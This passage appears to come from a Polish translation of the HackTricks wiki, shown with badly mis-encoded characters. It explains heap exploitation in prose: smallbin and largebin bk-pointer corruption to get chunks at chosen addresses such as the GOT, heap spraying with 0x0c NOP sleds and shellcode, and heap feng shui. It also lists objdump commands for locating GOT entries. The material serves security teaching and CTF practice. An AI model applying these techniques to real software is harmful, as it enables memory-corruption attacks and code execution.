Celem jest to, Å¼e jeÅ›li moÅ¼emy przepeÅ‚niÄ‡ stertÄ™, ktÃ³ra ma poniÅ¼ej siebie zwolniony kawaÅ‚ek w swoim binie, moÅ¼emy zmieniÄ‡ wskaÅºnik bk. JeÅ›li zmienimy wskaÅºnik bk tego kawaÅ‚ka i stanie siÄ™ on pierwszym na liÅ›cie bin, a nastÄ™pnie zostanie zarezerwowany, bin zostanie oszukany i pomyÅ›li, Å¼e ostatni kawaÅ‚ek na liÅ›cie (nastÄ™pny do zaoferowania) znajduje siÄ™ pod faÅ‚szywym adresem, ktÃ³ry podaliÅ›my (na stosie lub GOT, na przykÅ‚ad). Dlatego jeÅ›li zostanie zarezerwowany kolejny kawaÅ‚ek i atakujÄ…cy ma do niego uprawnienia, zostanie mu przydzielony kawaÅ‚ek na poÅ¼Ä…danej pozycji i bÄ™dzie mÃ³gÅ‚ w niÄ… pisaÄ‡.

Po zwolnieniu zmodyfikowanego kawaÅ‚ka konieczne jest zarezerwowanie kawaÅ‚ka wiÄ™kszego od zwolnionego, aby zmodyfikowany kawaÅ‚ek wyszedÅ‚ z unsorted bins i zostaÅ‚ umieszczony w swoim binie.

Gdy juÅ¼ znajdzie siÄ™ w swoim binie, naleÅ¼y zmieniÄ‡ wskaÅºnik bk za pomocÄ… przepeÅ‚nienia, aby wskazywaÅ‚ na adres, ktÃ³ry chcemy nadpisaÄ‡.

Bin musi poczekaÄ‡, aÅ¼ malloc() zostanie wywoÅ‚ane wystarczajÄ…co wiele razy, aby ponownie uÅ¼yÄ‡ zmodyfikowanego bina i oszukaÄ‡ bin, sprawiajÄ…c, Å¼e nastÄ™pny kawaÅ‚ek znajduje siÄ™ pod faÅ‚szywym adresem. NastÄ™pnie zostanie przydzielony poÅ¼Ä…dany kawaÅ‚ek.

Aby jak najszybciej wywoÅ‚aÄ‡ podatnoÅ›Ä‡, idealne jest: zarezerwowanie podatnego kawaÅ‚ka, zarezerwowanie kawaÅ‚ka, ktÃ³ry zostanie zmodyfikowany, zwolnienie tego kawaÅ‚ka, zarezerwowanie kawaÅ‚ka wiÄ™kszego od zmodyfikowanego, zmodyfikowanie kawaÅ‚ka (podatnoÅ›Ä‡), zarezerwowanie kawaÅ‚ka o takim samym rozmiarze co podatny i zarezerwowanie drugiego kawaÅ‚ka o takim samym rozmiarze, ktÃ³ry bÄ™dzie wskazywaÅ‚ na wybrany adres.

Aby zabezpieczyÄ‡ siÄ™ przed tym atakiem, stosuje siÄ™ standardowÄ… weryfikacjÄ™, czy kawaÅ‚ek â€nieâ€ jest faÅ‚szywy: sprawdza siÄ™, czy bck->fd wskazuje na victim. Innymi sÅ‚owy, w naszym przypadku, jeÅ›li wskaÅºnik fd\* faÅ‚szywego kawaÅ‚ka wskazuje na victim na stosie. Aby ominÄ…Ä‡ to zabezpieczenie, atakujÄ…cy musiaÅ‚by byÄ‡ w stanie w jakiÅ› sposÃ³b (prawdopodobnie przez stos) zapisaÄ‡ w odpowiednim miejscu adres victim. W ten sposÃ³b wyglÄ…daÅ‚oby to jak prawdziwy kawaÅ‚ek.

**Korupcja LargeBin**

Wymagane sÄ… te same warunki co wczeÅ›niej i kilka dodatkowych, ponadto zarezerwowane kawaÅ‚ki muszÄ… byÄ‡ wiÄ™ksze niÅ¼ 512.

Atak jest podobny do poprzedniego, czyli trzeba zmieniÄ‡ wskaÅºnik bk i potrzebne sÄ… wszystkie te wywoÅ‚ania malloc(), ale dodatkowo trzeba zmieniÄ‡ rozmiar zmodyfikowanego kawaÅ‚ka tak, aby to size - nb byÅ‚o < MINSIZE.

Na przykÅ‚ad, trzeba ustawiÄ‡ rozmiar na 1552, aby 1552 - 1544 = 8 < MINSIZE (odejmowanie nie moÅ¼e byÄ‡ ujemne, poniewaÅ¼ porÃ³wnuje siÄ™ wartoÅ›Ä‡ bez znaku)

Dodatkowo wprowadzono Å‚atkÄ™, aby sprawiÄ‡, Å¼e atak bÄ™dzie jeszcze trudniejszy.

**Rozpylanie sterty (Heap Spraying)**

Polega na rezerwacji jak najwiÄ™kszej iloÅ›ci pamiÄ™ci dla sterty i wypeÅ‚nienie jej poduszkÄ… z nops zakoÅ„czonÄ… shellcodem. Jako poduszki uÅ¼ywa siÄ™ 0x0c. NastÄ™pnie prÃ³buje siÄ™ skoczyÄ‡ do adresu 0x0c0c0c0c, wiÄ™c jeÅ›li jakaÅ› adres zostanie nadpisany tymi nopsami, zostanie tam skoczono. W skrÃ³cie, taktyka polega na zarezerwowaniu jak najwiÄ™kszej iloÅ›ci pamiÄ™ci, aby sprawdziÄ‡, czy jakiÅ› wskaÅºnik zostanie nadpisany, i skoczyÄ‡ do 0x0c0c0c0c, majÄ…c nadziejÄ™, Å¼e tam bÄ™dÄ… nopsy.

**Feng Shui sterty (Heap Feng Shui)**

Polega na cementowaniu pamiÄ™ci poprzez rezerwacje i zwalnianie kawaÅ‚kÃ³w w taki sposÃ³b, aby miÄ™dzy kawaÅ‚kami wolnymi pozostaÅ‚y zarezerwowane kawaÅ‚ki. Bufor do przepeÅ‚nienia zostanie umieszczony w jednym z tych kawaÅ‚kÃ³w.

**objdump -d executable** â€”> RozkÅ‚ada funkcje\
**objdump -d ./PROGRAMA | grep FUNCTION** â€”> Pobiera adres funkcji\
**objdump -d -Mintel ./shellcodeout** â€”> Aby sprawdziÄ‡, czy to na pewno nasz shellcode i uzyskaÄ‡ kody operacyjne\
**objdump -t ./exec | grep varBss** â€”> Tabela de sÃ­mbolos, aby uzyskaÄ‡ adres zmiennej i funkcji\
**objdump -TR ./exec | grep exit(func lib)** â€”> Aby uzyskaÄ‡ adres funkcji z bibliotek (GOT)\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** â€”> WyÅ›wietla adres puts do nadpisania w GOT\
**objdump -D ./exec** â€”> RozkÅ‚ada WSZYSTKO do wpisÃ³w plt\
**objdump -p -/exec**\
**Info functions strncmp â€”>** Informacje o funkcji w gdb

## InteresujÄ…ce kursy

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)
* [https://github.com/shellphish/how2heap](https://github.com/shellphish/how2heap)
* [https://pwnable.tw/](https://pwnable.tw/)
* [https://ctf.hackucf.org/](https://ctf.hackucf.org/)

## **Referencje**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
